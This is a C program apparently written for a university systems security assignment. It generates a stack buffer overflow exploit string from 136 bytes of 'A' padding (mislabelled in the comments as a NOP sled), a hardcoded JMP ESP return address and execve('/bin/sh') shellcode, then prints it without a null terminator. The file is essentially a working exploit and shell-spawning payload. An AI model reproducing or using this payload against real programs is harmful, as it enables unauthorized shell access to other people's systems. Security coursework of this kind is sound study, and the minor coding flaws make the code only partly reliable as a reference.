// Program: expgen.c
// Assignment 1 - Systems Security
// Matthew Kramer, U20891900

#include <stdio.h>
#include <string.h>

int main(void)
{
	// Integer for iterating
	int i;

	// Exploit string
	// 186 bytes = 136 bytes (NOP Sled) + 4 bytes (JMP ESP) + 46 bytes (Shell Code)
	char exploit[186];

	// Address of JMP ESP instruction - 4 bytes in Little Endian format
	char jmpesp[] = 	"\xa7\x2b\x12\x42";

	// Exploit shell code - 46 bytes
	char shellcode[] = 	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
						"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
						"\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

	// Concatenate 'NOP' sled to exploit string
	for(i = 0; i < 136; i++)
	{
		exploit[i] = 'A';
	}

	// Concatenate address of JMP ESP to exploit string
	for(i = 0; i < 4; i++)
	{
		exploit[i + 136] = jmpesp[i];
	}

	// Concatenate shell code to exploit string
	for(i = 0; i < 46; i++)
	{
		exploit[i + 140] = shellcode[i];
	}

	// Output finalized exploit string
	printf("%s", exploit);

	return 0;
}
